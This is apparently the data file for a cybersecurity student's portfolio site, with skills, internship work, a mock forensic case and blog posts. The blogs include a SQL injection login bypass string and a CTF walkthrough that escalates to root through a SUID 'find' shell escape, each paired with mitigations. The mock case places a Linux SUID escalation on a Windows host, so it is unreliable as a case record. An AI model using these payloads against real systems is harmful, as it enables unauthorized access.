const PORTFOLIO_DATA = {
  personal: {
    fullName: "Baldaniya Gautam Rameshbhai",
    title: "Cybersecurity Professional",
    specialization: "VAPT | SOC | Digital Forensics",
    email: "gautam6213@gmail.com",
    phone: "+91-8780789081",
    location: "Vadodara, Gujarat, India",
    linkedin: "https://linkedin.com/in/gautam6213",
    github: "https://github.com/BaldaniyaGautam6213",
    availability: "Immediate Joiner",
    relocation: "Yes (Open to Any Cybersecurity Hub)",
    languages: ["English", "Hindi", "Gujarati"],
    summary: "MCA graduate in Cyber Security & Forensics (Parul University) and a Cybersecurity enthusiast with hands-on experience spanning offensive VAPT, defensive SOC operations, and digital forensics. Secured 2nd place among 428 teams at Vadodara Hackathon 5.0 for building an AI-powered threat detection system. Proven capability in disk/memory forensics, web and network auditing, and designing tamper-evident audit-log chaining controls."
  },

  skills: [
    // VAPT
    { name: "Burp Suite", category: "vapt", level: 90, subtext: "Web proxy manipulation, repeater, intruder audits" },
    { name: "Nmap", category: "vapt", level: 95, subtext: "Network discovery, port auditing, NSE scripting" },
    { name: "Metasploit", category: "vapt", level: 85, subtext: "Exploit framework, payload generation, shell handler" },
    { name: "OWASP ZAP", category: "vapt", level: 80, subtext: "Automated vulnerability scanner, spiders, active scans" },
    { name: "ffuf & Gobuster", category: "vapt", level: 90, subtext: "Directory fuzzing, virtual host discovery, parameter fuzzing" },
    { name: "SQL Injection & XSS", category: "vapt", level: 90, subtext: "Manual detection and exploitation of server/client flaws" },
    { name: "Privilege Escalation", category: "vapt", level: 85, subtext: "Linux SUID/sudo abuse, Windows Registry/UAC bypasses" },
    
    // SOC
    { name: "SIEM Concepts", category: "soc", level: 80, subtext: "Log ingestion pipelines, correlation rules, Splunk/QRadar search" },
    { name: "Wireshark", category: "soc", level: 90, subtext: "PCAP packet dissection, protocol filtering, stream follow" },
    { name: "Log Analysis", category: "soc", level: 85, subtext: "Parsing Linux auth, Windows event logs, Nginx access records" },
    { name: "MITRE ATT&CK Mapping", category: "soc", level: 85, subtext: "Correlating alerts to TTP techniques & tacticals" },
    { name: "IDS/IPS Systems", category: "soc", level: 75, subtext: "Snort rulesets, Suricata traffic inspection" },

    // Forensics
    { name: "Volatility 3", category: "forensics", level: 85, subtext: "Memory forensics: pstree, filescan, registry hive dump" },
    { name: "Autopsy", category: "forensics", level: 80, subtext: "Disk image analysis, keyword searches, EXIF extraction" },
    { name: "FTK Imager", category: "forensics", level: 85, subtext: "RAW/E01 image capture, file hashing (MD5/SHA256), registry carving" },
    { name: "Chain of Custody", category: "forensics", level: 90, subtext: "Documenting evidence handling, hash verification records" },
    { name: "Timeline Reconstruction", category: "forensics", level: 85, subtext: "Piecing MACB metadata timestamps to build intrusion tracks" },

    // Networking & OS
    { name: "TCP/IP & DNS", category: "networking", level: 90, subtext: "L3/L4 handshake, DNS zone transfers, subnet routing" },
    { name: "Kali Linux", category: "networking", level: 95, subtext: "Primary operational security OS, tool configurations" },
    { name: "Windows Security", category: "networking", level: 85, subtext: "Active Directory security, GPOs, Audit policies" },
    { name: "Linux Security Audits", category: "networking", level: 90, subtext: "Analyzing file permissions, shadow hashes, cron tasks" },

    // Programming
    { name: "Python", category: "programming", level: 85, subtext: "Scripting exploits, automation scripts, ML model integration" },
    { name: "Bash Scripting", category: "programming", level: 80, subtext: "SOC triage scripts, log filtering automation" },
    { name: "Cryptography basics", category: "programming", level: 85, subtext: "SHA chaining, HMAC, AES-256 block modes" }
  ],

  experience: [
    {
      id: "internship-dharma",
      company: "Dharma Infotech",
      location: "Vadodara, India",
      role: "Cybersecurity Analyst Intern",
      period: "2025 - Present",
      overview: "During my internship, I bridged the gap between offensive testing and defensive operations. I worked on end-to-end vulnerability scans, SOC analysis workflows, security log integrity, and memory/disk forensic investigations.",
      tasks: [
        {
          title: "Web & Network VAPT Campaigns",
          objectives: "Identify, exploit, and document security flaws across target web configurations and network assets.",
          tools: ["Burp Suite", "Nmap", "ffuf", "Metasploit", "OWASP ZAP"],
          challenges: "Bypassing basic web application firewalls and escalating local shells using complex privilege escalation vectors.",
          solutions: "Conducted manual param fuzzing via Burp. Identified SUID binary abuse paths (e.g. `/usr/bin/find` configuration errors) and privilege audits on sudo configurations.",
          impact: "Audited 5+ host environments, finding SQLi, XSS, and local privilege escalation vectors, yielding secure systems post-remediation.",
          lessons: "Offensive security requires patience; automated tools only scan surface details—manual verification is where critical flaws reside.",
          concepts: "OWASP Top 10, PrivEsc (SUID/Sudo Configuration), Privilege Separation, Vulnerability Lifecycle."
        },
        {
          title: "SOC Event Triage & Incident Monitoring",
          objectives: "Investigate suspicious network behaviors, trace threat campaigns, and map attacks to structured matrices.",
          tools: ["Wireshark", "Splunk", "TCPdump"],
          challenges: "Identifying stealthy port scans and command-and-control (C2) beaconing in high-volume traffic channels.",
          solutions: "Applied precise Wireshark filters to isolate TCP handshake anomalies and mapped malicious flows to MITRE ATT&CK tactics.",
          impact: "Structured formal incident reports detailing threat severity ratings, escalation recommendation flows, and remediation controls.",
          lessons: "Packet captures tell the complete story of a breach. Correctly tagging alert anomalies prevents alert fatigue.",
          concepts: "MITRE ATT&CK Framework, Network Base-lining, Attack Vector Identification, Alert Escalation."
        },
        {
          title: "Tamper-Evident Cryptographic Logging",
          objectives: "Simulate enterprise-grade security log controls that detect unauthorized audit log alterations.",
          tools: ["Python", "SHA-256 Hash Chaining", "HMAC"],
          challenges: "Ensuring high-speed validation of logs while maintaining cryptographic integrity against data reordering attacks.",
          solutions: "Engineered a log chaining system where each entry hashes its payload alongside the hash of the preceding record (similar to blockchain block-headers).",
          impact: "Secured 100% detection rate of deletions, additions, and log message modification during validation tests.",
          lessons: "Log protection is critical; if an attacker compromises a server, their first action is to delete syslog traces. Cryptographic chaining blocks this.",
          concepts: "Hash Chaining, Log Integrity, Non-repudiation, Tamper Detection."
        },
        {
          title: "Windows Digital Forensic Investigations",
          objectives: "Reconstruct the timeline of a simulated insider threat actor who leaked confidential files via VeraCrypt.",
          tools: ["Volatility 3", "Autopsy", "FTK Imager"],
          challenges: "Uncovering evidence files encrypted inside a hidden container and locating volatile memory traces.",
          solutions: "Acquired a physical memory dump using FTK. Used Volatility to extract process listings and carved VeraCrypt keys. Searched the Autopsy database to discover USB registry artifacts.",
          impact: "Reconstructed a complete, chronological timeline of the attacker's actions, from USB insertion to encrypted container mounting and file copy.",
          lessons: "Deleted files are rarely fully gone. Memory registry hives hold vital keys that remain long after files are closed.",
          concepts: "Memory Carving, Registry Analysis, USB Forensics, Chain of Custody."
        }
      ]
    }
  ],

  projects: [
    {
      id: "hackathon-threat-ml",
      title: "AI-Powered Drug Trafficking Detection System",
      event: "Vadodara Hackathon 5.0",
      award: "2nd Place / 428 Competing Teams (Tech Expo 2025 Nominee)",
      tags: ["Python", "Django", "ReactJS", "NLP", "Machine Learning"],
      overview: "An ML-powered threat intelligence pipeline designed to monitor social media feeds, detect suspicious behavioral anomaly patterns, and alert law enforcement about cybercriminal activities.",
      problem: "Traditional keyword matching fails to detect encrypted drug sales on social platforms because traffickers continuously evolve their coded vocabulary.",
      objectives: "Design a natural language classifier that understands contextual drug-slang variations, maps suspicious users, and provides alerts.",
      architecture: "Social feeds ingestion layer -> NLP tokenization and vectorization -> Random Forest and BERT classifier -> Django Alert API backend -> React dashboard alerting panel.",
      challenges: "High rate of false positives on general slang words.",
      solutions: "Implemented behavioral tracking. Instead of flagging single posts, the system weights alerts based on account activity, direct messages triggers, and temporal patterns.",
      security: "Encrypted API tokens, role-based access control for dashboard metrics, audit trails for investigations.",
      tools: ["Python (NLTK, Scikit-learn)", "Django REST", "ReactJS", "SQLite"],
      results: "Achieved 91.5% classification accuracy. Secured 2nd place out of 428 participating teams and selected for prestigious Tech Expo 2025.",
      lessons: "Integrating machine learning with traditional alert scoring dramatically reduces false-positive noise in intelligence operations."
    },
    {
      id: "crypto-password-generator",
      title: "Cryptographically Secure Password Generator",
      tags: ["Python", "Tkinter", "NIST SP 800-63B"],
      overview: "A desktop GUI application that generates cryptographically strong, custom-entropy passwords based on NIST guidelines, with integrated password-strength evaluation.",
      problem: "Standard programming language random libraries (like Python's `random`) are pseudo-random and predictable, making generated passwords vulnerable to cryptanalysis.",
      objectives: "Build a tool utilizing cryptographically secure pseudo-random number generators (CSPRNG) with configurable length and character-set controls.",
      architecture: "Tkinter front-end interface -> Python `secrets` module CSPRNG engine -> Shannon Entropy calculator -> NIST 800-63B policy validator.",
      challenges: "Ensuring passwords contain at least one character from each active category without lowering password randomness.",
      solutions: "Utilized rejection sampling to ensure target configurations are met, keeping the generated sequence unpredictable.",
      security: "Cryptographic entropy sourcing from the underlying OS kernel (`/dev/urandom` / Windows CryptGenRandom). Zero clipboard lingering (clears output in 30 seconds).",
      tools: ["Python", "Tkinter Library", "`secrets` & `hashlib` modules"],
      results: "Outputs high-entropy strings (e.g. >100 bits of Shannon Entropy) aligned with strict federal authentication standards.",
      lessons: "Cryptographic security is only as strong as its source of randomness. Never use standard loops or PRNGs for security operations."
    }
  ],

  forensicsCase: {
    caseName: "Sec-Inc-2025-09: Insufficient Audit Integrity & Unauthorized Data Leak",
    investigator: "B. Gautam R.",
    status: "CLOSED - EVIDENCE LOCKED",
    chainOfCustody: [
      { step: 1, action: "Acquisition of RAM & USB storage", handler: "B. Gautam", date: "2025-09-12 10:15", hash: "SHA256: e3b0c442... [MATCHED]" },
      { step: 2, action: "Memory extraction (Volatility 3 analysis)", handler: "B. Gautam", date: "2025-09-12 14:00", hash: "SHA256: 4fbc8a23... [SECURED]" },
      { step: 3, action: "Disk mounting and Autopsy indexing", handler: "B. Gautam", date: "2025-09-13 09:30", hash: "SHA256: 8a99cc12... [SECURED]" },
      { step: 4, action: "Recovery of container and report generation", handler: "B. Gautam", date: "2025-09-14 16:20", hash: "SHA256: 7f33d100... [LOCKED]" }
    ],
    timeline: [
      { time: "2025-09-12 09:12", title: "Phishing Attack Vector", desc: "User clicks email link executing malicious payload setting local registry entries.", threat: true },
      { time: "2025-09-12 09:20", title: "SUID Binary Escalation", desc: "Threat actor abuses misconfigured SUID binary `/usr/bin/find` to execute bash with root credentials.", threat: true },
      { time: "2025-09-12 09:35", title: "USB Drive Inserted", desc: "Windows Registry records USB drive (Kingston DataTraveler, serial: K12903AA) connection.", threat: false },
      { time: "2025-09-12 09:40", title: "VeraCrypt Container Mount", desc: "Volatility memory traces show process `veracrypt.exe` spawned (PID 3820) mounting an encrypted container file `/Users/finance/enc_evidence.hc`.", threat: true },
      { time: "2025-09-12 09:48", title: "Data Exfiltration Completed", desc: "Confidential spreadsheets copied into mounted container. USB drive unmounted and disconnected.", threat: true },
      { time: "2025-09-12 10:10", title: "Incident Response Initiated", desc: "SOC triggers host isolation. Physical memory captured via FTK Imager CLI tool.", threat: false }
    ],
    volatilityOutput: {
      imageinfo: `
$ python3 vol.py -f memory_dump.raw windows.info.Info
Volatility 3 Framework 2.4.1

Kernel Base: 0xf800e8400000
DTB: 0x1aa000
OS Version: 10.0.19041
Processor Arch: x86_64
Number of CPUs: 4
System Time: 2025-09-12 10:10:04 UTC
`,
      pstree: `
$ python3 vol.py -f memory_dump.raw windows.pstree.PsTree
Volatility 3 Framework 2.4.1

PID    PPID   ImageName              Offset      Threads  SessionId  Wow64
4      0      System                 0x808df24   142      0          False
640    4      smss.exe               0x854f300   5        0          False
812    640    csrss.exe              0x892a400   12       0          False
880    640    wininit.exe            0x8bb8c00   8        0          False
1024   880    services.exe           0x8c2b100   68       0          False
1148   880    lsass.exe              0x8db1200   14       0          False
1840   1024   svchost.exe            0x902e400   24       0          False
2912   1024   spoolsv.exe            0x9f1a200   11       0          False
3440   1024   explorer.exe           0xa2ff100   84       1          False
3820   3440   veracrypt.exe          0xb51a300   18       1          True   [!] SUSPICIOUS TARGET PROCESS
`,
      filescan: `
$ python3 vol.py -f memory_dump.raw windows.filescan.FileScan | grep -i ".hc"
Volatility 3 Framework 2.4.1

Offset             Name
0x00003ffd1ab230   \\Device\\HarddiskVolume4\\Users\\finance\\enc_evidence.hc
`
    }
  },

  certifications: [
    {
      title: "Master of Computer Applications (M.C.A.)",
      issuer: "Parul University, Vadodara",
      details: "Cyber Security & Forensics | CGPA: 7.85/10",
      date: "2024 - 2026",
      category: "academic"
    },
    {
      title: "Bachelor of Computer Applications (B.C.A.)",
      issuer: "Maharaja Sayajirao University of Baroda",
      details: "Science Faculty | CGPA: 6.67/10",
      date: "2021 - 2024",
      category: "academic"
    },
    {
      title: "2nd Place Hackathon Prize Recipient",
      issuer: "Vadodara Hackathon 5.0 Jury Panel",
      details: "Competed against 428 teams in building AI threat pipelines.",
      date: "Sep 2025",
      category: "tech"
    },
    {
      title: "Cybersecurity Analyst Intern Certification",
      issuer: "Dharma Infotech",
      details: "Verified practical projects in offensive and defensive security operations.",
      date: "2025",
      category: "tech"
    }
  ],

  blogs: [
    {
      id: "blog-owasp-top10",
      title: "Web Penetration Testing: Exploiting & Fixing OWASP Top 10 Flaws",
      category: "owasp",
      date: "2025-07-02",
      readTime: "6 min read",
      author: "Gautam R. Baldaniya",
      summary: "A practical guide detailing how to exploit typical OWASP Top 10 vulnerabilities (SQLi, CSRF, IDOR) and implement robust remediation code filters.",
      content: `
<h3>Introduction</h3>
<p>Modern web vulnerabilities allow threat actors to perform database exfiltration, session hijacking, or achieve remote code executions. As a security analyst, testing must follow structured vulnerability methodologies (like OWASP Web Security Testing Guide).</p>

<h3>1. SQL Injection (SQLi) Case Study</h3>
<p>An insecure login endpoint evaluates variables directly in the database parser:</p>
<pre># VULNERABLE CODE IN PYTHON / FLASK
query = "SELECT * FROM users WHERE username = '" + user_input + "' AND password = '" + pass_input + "'"
db.execute(query)</pre>
<p>An attacker submits: <code>' OR 1=1 --</code>, forcing the parser to authenticate any login without verification. To remediation this, parameterized queries (prepared statements) must be enforced:</p>
<pre># REMEDIATION SECURE IMPLEMENTATION
query = "SELECT * FROM users WHERE username = %s AND password = %s"
db.execute(query, (user_input, pass_input))</pre>

<h3>2. Cross-Site Scripting (XSS) Prevention</h3>
<p>XSS occurs when client browser input is reflected without sanitization. Mitigate by encoding outputs (HTML entity escaping) and setting strict Content Security Policies (CSP) headers that limit script execution regions: <code>Content-Security-Policy: default-src 'self'; script-src 'self' https://trustedcdn.com;</code></p>

<h3>Conclusion</h3>
<p>Security is a continuous cycle. Regular fuzzing using tools like ffuf/Gobuster alongside proxy analysis in Burp Suite is critical to catch these flaws before production deployment.</p>
`
    },
    {
      id: "blog-tamper-logging",
      title: "Log Integrity Audits: Creating Tamper-Evident Logs with Cryptographic Hash Chains",
      category: "blue",
      date: "2025-05-15",
      readTime: "8 min read",
      author: "Gautam R. Baldaniya",
      summary: "How to design a secure local server logging mechanism that prevents intruders from modifying system audit logs undetected.",
      content: `
<h3>The Incident Response Challenge</h3>
<p>When system compromises occur, the first action of a skilled threat actor is to delete or alter <code>/var/log/auth.log</code> or local syslogs to cover their lateral movement tracks. If logs cannot be trusted, forensics is rendered impossible.</p>

<h3>Hash Chaining Architecture</h3>
<p>To detect deletions or insertions, logs can be chained cryptographically. In this system:
<br><code>Hash(N) = SHA256( LogMessage(N) + Timestamp(N) + Hash(N-1) )</code>
</p>
<p>If an attacker deletes Log Entry #3, the validation check of Log Entry #4 will immediately fail because the hash values will not chain together. Here is a simple Python simulation of the ingestion and validation flow:</p>

<pre># Python Ingestion Simulation
import hashlib
import time

class TamperLog:
    def __init__(self):
        self.chain = []
        self.last_hash = "0" * 64

    def write_log(self, message):
        timestamp = str(time.time())
        payload = f"{message}|{timestamp}|{self.last_hash}"
        current_hash = hashlib.sha256(payload.encode()).hexdigest()
        
        self.chain.append({
            "message": message,
            "timestamp": timestamp,
            "prev_hash": self.last_hash,
            "hash": current_hash
        })
        self.last_hash = current_hash

    def validate(self):
        expected_prev = "0" * 64
        for i, entry in enumerate(self.chain):
            payload = f"{entry['message']}|{entry['timestamp']}|{entry['prev_hash']}"
            check_hash = hashlib.sha256(payload.encode()).hexdigest()
            
            if check_hash != entry['hash'] or entry['prev_hash'] != expected_prev:
                print(f"[!] Tampering detected at index {i}!")
                return False
            expected_prev = entry['hash']
        print("[+] Log integrity verified successfully.")
        return True
</pre>

<h3>Practical Deployments</h3>
<p>By forwarding these hashes to a read-only logging server or writing them onto write-once-read-many (WORM) hardware, organizations can build tamper-evident auditing systems that even root administrators cannot falsify.</p>
`
    },
    {
      id: "writeup-linux-privesc",
      title: "CTF Walkthrough: Abusing Linux SUID Binaries and Sudo Configurations",
      category: "writeup",
      date: "2025-02-10",
      readTime: "5 min read",
      author: "Gautam R. Baldaniya",
      summary: "A vulnerability writeup of a simulated server exploit detailing how an initial low-privilege shell escalates to root via binary permissions.",
      content: `
<h3>Target Overview</h3>
<ul>
  <li><strong>Target Name:</strong> SecCommand-01</li>
  <li><strong>OS:</strong> Ubuntu 22.04 LTS</li>
  <li><strong>Exploitation Path:</strong> Directory traversal -> low shell -> SUID find bin -> root flag</li>
</ul>

<h3>1. Reconnaissance</h3>
<p>Nmap scan shows port 80 and port 22 open. Directory directory fuzzing with ffuf exposes <code>/dev/backup.txt</code> which holds a weak SSH credential: <code>devuser:SecPass123!</code>.</p>

<h3>2. Shell Access & Enumeration</h3>
<p>Logging in via SSH gives us access as <code>devuser</code>. We execute a SUID binary enumeration command:</p>
<pre>$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/find   <--- SUSPICIOUS SUID BIT SET</pre>

<h3>3. Exploitation (SUID Abuse)</h3>
<p>The <code>find</code> command executes with root privilege policies if the SUID bit is set. We consult GTFOBins and execute the execution escape payload:</p>
<pre>$ /usr/bin/find . -exec /bin/sh -p \\; -quit
# whoami
root
# cat /root/root.txt
FLAG{SUID_EXPLOIT_SUCCESSFUL_87693}</pre>

<h3>Mitigation Advice</h3>
<p>Regularly audit system directories to ensure SUID bits are only applied to necessary system binaries. Never apply SUID properties to programming interpreters, utility tools, or text editors (e.g. python, find, vim, nano).</p>
`
    }
  ]
};
